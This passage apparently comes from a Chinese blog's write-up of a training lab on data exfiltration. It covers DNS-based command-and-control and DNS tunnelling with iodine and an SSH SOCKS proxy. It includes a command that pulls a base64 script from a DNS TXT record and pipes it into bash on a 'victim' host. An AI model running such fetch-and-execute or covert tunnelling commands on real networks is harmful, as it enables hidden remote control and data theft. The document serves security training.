<p>例如，假设我们有一个需要在受害计算机上执行的脚本。首先，我们需要将脚本编码为 Base64 表示形式，然后使用编码脚本的内容创建您控制的域名的 TXT DNS 记录。以下是需要添加到域名的所需脚本示例：</p>
<pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash </span>
ping -c 1 test.thm.com</code></pre>
<p>该脚本在受害计算机中执行 ping 命令并向 <a target="_blank" rel="noopener" href="http://test.tunnel.com">test.tunnel.com</a> 发送一个 ICMP 数据包。请注意，该脚本只是一个示例，可以替换为任何内容。现在使用您最喜欢的文本编辑器将脚本保存到/tmp/script.sh，然后使用 Base64 对其进行编码，如下所示，</p>
<p>现在我们有了脚本的 Base64 表示形式，我们将其作为 TXT DNS 记录添加到我们控制的域中，<a target="_blank" rel="noopener" href="http://xn--tunnel-9v7iod27l3q1aui4b.com">在本例中为tunnel.com</a>。您可以通过我们提供的 Web 界面 <a target="_blank" rel="noopener" href="http://10.10.41.88/">http://10.10.41.88/</a> 或 <a target="_blank" rel="noopener" href="https://10-10-41-88.p.thmlabs.com/">https://10-10-41-88.p.thmlabs.com/</a> 添加它，而无需使用 VPN。</p>
<p>添加后，我们通过请求本地 DNS 服务器解析 <a target="_blank" rel="noopener" href="http://script.tunnel.com">script.tunnel.com</a> 的 TXT 记录来确认我们已成功创建脚本的 DNS 记录。如果一切设置正确，我们应该会收到上一步中添加的内容。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009686.png" alt></p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>2$ dig +short -t TXT script.tunnel.com</code></pre>
<p>我们使用 dig 命令来检查我们在上一步中添加的 DNS 记录的 TXT 记录！结果，我们可以在 TXT 回复中获取我们脚本的内容。现在我们确认了TXT记录，我们执行如下，</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>2$ dig +short -t TXT script.tunnel.com | tr -d <span class="hljs-string">"\""</span> | base64 -d | bash</code></pre>
<p>请注意，我们在使用 tr 执行脚本并删除任何双引号 " 之前清理了输出。然后，我们使用 base64 -d 解码 Base64 文本表示，最后将内容传递给 bash 命令来执行。</p>
<p>现在复制 C2 通信步骤来执行 <a target="_blank" rel="noopener" href="http://flag.tunnel.com">flag.tunnel.com</a> TXT 记录的内容并回答以下问题。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009687.png" alt></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009688.png" alt></p>
<h1 id="0x11-dns-隧道">0x11 DNS 隧道</h1>
<p>此任务将展示如何通过 DNS 协议创建隧道。确保您理解上一个任务（通过 DNS 的 Exifltration）中讨论的概念，因为 DNS 隧道工具基于相同的技术工作。</p>
<h2 id="dns-隧道-tcpoverdns">DNS 隧道 (TCPoverDNS)</h2>
<p>此技术也称为 TCP over DNS，其中攻击者使用 DNS 数据渗透技术通过 DNS 协议封装其他协议，例如 HTTP 请求。 DNS 隧道建立了一个连续发送和接收数据的通信通道。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009689.png" alt></p>
<p>本节将介绍通过 DNS 建立通信通道所需的步骤。我们将该技术应用于我们提供的网络基础设施（JumpBox 和 Victim2），以从网络 2 (192.168.0.0/24) 转移到网络 1 (172.20.0.0/24) 并访问内部 Web 服务器。有关网络基础设施的更多信息，请查看任务 2。</p>
<p>我们将使用 <a target="_blank" rel="noopener" href="https://github.com/yarrick/iodine">iodine</a> 工具来创建 DNS 隧道通信。请注意，我们已经在 J​​umpBox 和 Attacker 机器上安装了 iodine。要建立 DNS 隧道，我们需要执行以下步骤：</p>
<ol>
<li>确保更新 DNS 记录并创建指向 AttackBox 计算机的新 NS 点（检查任务 8），或者您可以使用预配置的名称服务器，该服务器指向攻击者计算机 (att.tunnel.com=172.20.0.200)。</li>
<li>从 AttackBox 或攻击者机器运行 iodined 服务器。 （注意服务器端我们使用iodine<strong>d</strong>）</li>
<li>在 JumpBox 上，运行 iodine 客户端来建立连接。 （请注意，对于客户端，我们使用iodine - 不含 d）</li>
<li>通过 SSH 连接到已创建网络接口上的计算机，以通过 DNS 创建代理。我们将使用 -D 参数来创建动态端口转发。</li>
<li>一旦建立了SSH连接，我们就可以在Firefox或ProxyChains中使用本地IP和本地端口作为代理。</li>
</ol>
<p>让我们按照步骤创建 DNS 隧道。首先，让我们运行服务器端应用程序（iodined），如下所示，</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@attacker</span>$ sudo iodined -f -c -P thmpass <span class="hljs-number">10.1</span>.<span class="hljs-number">1.1</span>/<span class="hljs-number">24</span> att.tunnel.com                                                                                                                                                    
Opened dns0
Setting IP of dns0 to <span class="hljs-number">10.1</span>.<span class="hljs-number">1.1</span>
Setting MTU of dns0 to <span class="hljs-number">1130</span>
Opened IPv4 UDP socket
Listening to dns for domain att.tunnel.com</code></pre>
<p>让我们进一步解释一下前面的命令：</p>
<ul>
<li>确保使用 sudo 执行该命令。 iodined 为 DNS 上的隧道创建一个新的网络接口 (dns0)。</li>
<li>-f 参数是在前台运行服务器。</li>
<li>-c 参数是跳过检查每个 DNS 请求的客户端 IP 地址和端口。</li>
<li>-P 参数用于设置身份验证密码。</li>
<li>10.1.1.1/24 参数用于设置新网络接口 (dns0) 的网络 IP。服务器的 IP 地址为 10.1.1.1，客户端的 IP 地址为 10.1.1.2。</li>
<li><a target="_blank" rel="noopener" href="http://att.tunnel.com">att.tunnel.com</a> 是我们之前设置的名称服务器。</li>
</ul>
<p>在 JumpBox 机器上，我们需要连接到服务器端应用程序。为此，我们需要执行以下操作：</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>:~$ sudo iodine -P thmpass att.tunnel.com                                                                                                           
Opened dns0                                                                                                                                                     
Opened IPv4 UDP socket                                                                                                                                          
Sending DNS queries for att.tunnel.com to <span class="hljs-number">127.0</span>.<span class="hljs-number">0.11</span>                                                                                                            
Autodetecting DNS query type (use -T to override).                                                                                                              
Using DNS type NULL queries                                                                                                                                     
Version ok, both using protocol v <span class="hljs-number">0</span>x00000502. You are user #<span class="hljs-number">0</span>                                                                                                   
Setting IP of dns0 to <span class="hljs-number">10.1</span>.<span class="hljs-number">1.2</span>                                                                                                                                  
Setting MTU of dns0 to <span class="hljs-number">1130</span>                                                                                                                                     
Server tunnel IP is <span class="hljs-number">10.1</span>.<span class="hljs-number">1.1</span>                                                                                                                                    
Testing raw UDP data to the server (skip with -r)                                                                                                               
Server is at <span class="hljs-number">172.20</span>.<span class="hljs-number">0.200</span>, trying raw <span class="hljs-attribute">login</span>: OK                                                                                                                 
Sending raw traffic directly to <span class="hljs-number">172.20</span>.<span class="hljs-number">0.200</span>                                                                                                                    
Connection setup complete, transmitting data.</code></pre>
<p>请注意，我们执行了客户端工具（iodine）并提供了之前解释过的 -f 和 -P 参数。建立连接后，我们打开一个新终端并通过 SSH 登录到 10.1.1.1。</p>
<p>请注意，网络 10.1.1.1/24 上的所有通信都将通过 DNS 进行。我们将使用动态端口转发功能的 -D 参数来使用 SSH 会话作为代理。请注意，我们使用 -f 参数强制 ssh 进入后台。 -4 参数强制 ssh 客户端仅绑定到 IPv4。</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@attacker</span>$ ssh thm@<span class="hljs-number">10.1</span>.<span class="hljs-number">1.2</span> -<span class="hljs-number">4</span> -f -N -D <span class="hljs-number">1080</span>

#具体参数解释:
#- ssh thm@<span class="hljs-number">10.1</span>.<span class="hljs-number">1.2</span>: 连接远程服务器<span class="hljs-number">10.1</span>.<span class="hljs-number">1.2</span>，登录用户名是thm
#- -<span class="hljs-number">4</span>: 使用IPv4地址，不使用IPv6
#- <span class="hljs-attribute">-f</span>: 将SSH在后台运行，不连接控制终端
#- <span class="hljs-attribute">-N</span>: 不执行远程命令，仅用于端口转发
#- -D <span class="hljs-number">1080</span>: 在本地端口<span class="hljs-number">1080</span>上创建一个SOCKS代理</code></pre>
<p>现在我们已经通过 dns0 网络连接到 JumpBox，打开一个新终端并使用 ProxyChains 或 Firefox，将 127.0.0.1 和端口 1080 作为代理设置。</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@attacker</span>$ proxychains curl <span class="hljs-attribute">http</span>://<span class="hljs-number">192.168</span>.<span class="hljs-number">0.100</span>/demo.php
root<span class="hljs-keyword">@attacker</span>$ #<span class="hljs-keyword">OR</span>
root<span class="hljs-keyword">@attacker</span>$ curl --socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1080</span> <span class="hljs-attribute">http</span>://<span class="hljs-number">192.168</span>.<span class="hljs-number">0.100</span>/demo.php</code></pre>
<p>我们可以通过eth0接口检查攻击者机器上的Tcpdump来确认所有流量都经过DNS协议。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009690.png" alt></p>
<p>在所提供的网络环境中应用DNS隧道技术，访问<a target="_blank" rel="noopener" href="http://192.168.0.100/test.php%E5%9B%9E%E7%AD%94%E4%BB%A5%E4%B8%8B%E9%97%AE%E9%A2%98">http://192.168.0.100/test.php回答以下问题</a>.<br>
<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009691.png" alt></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009692.png" alt></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009693.png" alt></p>
<h1 id="0x011-结论">0x011 结论</h1>
<p>在这个房间中，我们介绍了数据泄露技术的基础知识，包括各种网络协议：</p>
<ul>
<li>TCP&nbsp;Sockets</li>
<li>SSH</li>
<li>HTTP/HTTPS</li>
<li>ICMP</li>
<li>DNS<br>
完成这个房间后，您现在应该对什么是数据泄露以及可以尝试用于传输数据的类型和协议有一个大致的了解。</li>
</ul>
<h2 id="例子">例子</h2>
<p>以下是因数据泄露技术而成为数据泄露受害者的公司。</p>
<ol>
<li>SunTrust 银行发生了一起内部数据泄露事件，在多达 150 万个客户敏感数据（包括姓名、地址、电话号码和账户余额）被盗后，发现了离开网络的可疑流量。</li>
<li>特斯拉是内部人士数据泄露的受害者，导致数据泄露。 2018 年，一名员工向第三方泄露了数十亿字节的机密照片和代码制造操作系统，其中包括其他个人和敏感数据。</li>
<li>Travelex 是世界领先的货币兑换专家。 2020 年，它是名为 Sodinokibi 的勒索软件的受害者。攻击者利用其中一台内部服务器的未修补漏洞。攻击者利用其中一台内部服务器中未修补的漏洞，使他们能够使用其中一种渗透技术将敏感数据从组织的网络中渗漏出来。敏感数据包括个人身份信息 (PII) 和财务信息。</li>
</ol>
<h2 id="其他资源">其他资源</h2>
<p>数据泄露并不限于本会议室讨论的协议和方法。以下链接是“Living Off Trusted Sites”，可用于窃取数据或使用合法网站进行 C2 通信。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://lots-project.com/">依靠可信站点 (LOTS) 项目生活</a></li>
</ul>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/07/20/linux-ti-quan-xue-xi-yi/">Linux提权学习之rbash逃逸</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/07/16/thm-enumeration/">THM-Enumeration</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%BB%8B%E7%BB%8D"><span class="toc-text">0x01 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-text">欢迎来到数据泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87"><span class="toc-text">学习目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%BF%E9%97%B4%E5%85%88%E5%86%B3%E6%9D%A1%E4%BB%B6"><span class="toc-text">房间先决条件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD"><span class="toc-text">0x02 网络基础设施</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-text">部署虚拟机！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8E%A8%E8%8D%90"><span class="toc-text">实验室推荐</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-text">0x03 数据泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-text">什么是数据泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E6%B8%97%E9%80%8F"><span class="toc-text">如何使用数据渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9F%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-text">传统数据泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c2-%E9%80%9A%E8%AE%AF"><span class="toc-text">C2 通讯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-text">隧道技术</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-tcp-socket-%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F"><span class="toc-text">0x04 TCP socket 进行渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-ssh-%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F"><span class="toc-text">0x05 SSH 进行渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-https-%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F"><span class="toc-text">0x06 HTTP(S) 进行渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#http-post-%E8%AF%B7%E6%B1%82"><span class="toc-text">HTTP POST 请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-text">HTTP 数据泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#https-%E9%80%9A%E8%AE%AF"><span class="toc-text">HTTPS 通讯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-%E9%9A%A7%E9%81%93"><span class="toc-text">HTTP 隧道</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E4%BD%BF%E7%94%A8-icmp-%E6%B8%97%E9%80%8F"><span class="toc-text">0x07 使用 ICMP 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#icmp-%E6%95%B0%E6%8D%AE%E9%83%A8%E5%88%86"><span class="toc-text">ICMP 数据部分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#icmp-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-text">ICMP 数据泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#icmp-c2-%E9%80%9A%E4%BF%A1"><span class="toc-text">ICMP C2 通信</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-dns-%E9%85%8D%E7%BD%AE"><span class="toc-text">0x08 DNS 配置</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E6%94%BB%E5%87%BB%E6%9C%BA"><span class="toc-text">新攻击机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E4%BA%8E-dns-%E6%B8%97%E9%80%8F%E7%9A%84%E5%90%8D%E7%A7%B0%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">用于 DNS 渗透的名称服务器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%BB%BA%E8%AE%AE"><span class="toc-text">实验室建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dns%E6%B5%8B%E8%AF%95"><span class="toc-text">DNS测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E7%94%A8-dns-%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F"><span class="toc-text">0x09 用 DNS 进行渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-dns-%E6%95%B0%E6%8D%AE%E6%B8%97%E9%80%8F"><span class="toc-text">什么是 DNS 数据渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E9%9C%80%E8%A6%81%E4%BD%BF%E7%94%A8-dns-%E6%95%B0%E6%8D%AE%E8%BF%87%E6%BB%A4"><span class="toc-text">什么时候需要使用 DNS 数据过滤？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9dns%E8%AE%B0%E5%BD%95"><span class="toc-text">修改DNS记录！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dns-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-text">DNS 数据泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-dns-%E7%9A%84-c2-%E9%80%9A%E4%BF%A1"><span class="toc-text">通过 DNS 的 C2 通信</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x11-dns-%E9%9A%A7%E9%81%93"><span class="toc-text">0x11 DNS 隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dns-%E9%9A%A7%E9%81%93-tcpoverdns"><span class="toc-text">DNS 隧道 (TCPoverDNS)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x011-%E7%BB%93%E8%AE%BA"><span class="toc-text">0x011 结论</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-text">例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%B5%84%E6%BA%90"><span class="toc-text">其他资源</span></a></li></ol></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
